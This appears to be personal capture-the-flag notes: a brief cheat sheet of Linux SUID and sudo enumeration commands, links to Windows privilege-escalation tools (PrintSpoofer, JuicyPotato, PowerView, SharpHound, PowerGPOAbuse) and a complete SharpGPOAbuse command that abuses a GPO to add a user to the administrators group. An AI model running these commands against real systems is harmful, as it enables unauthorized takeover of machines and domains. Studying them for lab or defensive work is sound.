# Linux Privesc
```sudo -l
```
```
find / -type f -perm -u=s 2>/dev/null
```
```
find / -type f -perm -4000 2>/dev/null
```
# Window Privesc
## PrintSpoofer.exe
```
https://github.com/itm4n/PrintSpoofer
```
## JuicyPotato
```
https://github.com/ohpe/juicy-potato
```
## Powerview
```
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```
## SharpHound
```
https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
```
## PowerGPOAbuse
```
https://github.com/rootSySdk/PowerGPOAbuse
https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/master/PowerGPOAbuse.ps1
```
```
.\SharpGPOAbuse.exe --AddComputerTask --TaskName 'noraj' --Author 'vulnnet\administrator' --Command "powershell.exe /c" --Arguments "net localgroup administrators enterprise-security /add" --GPOName "security-pol-vn"
```
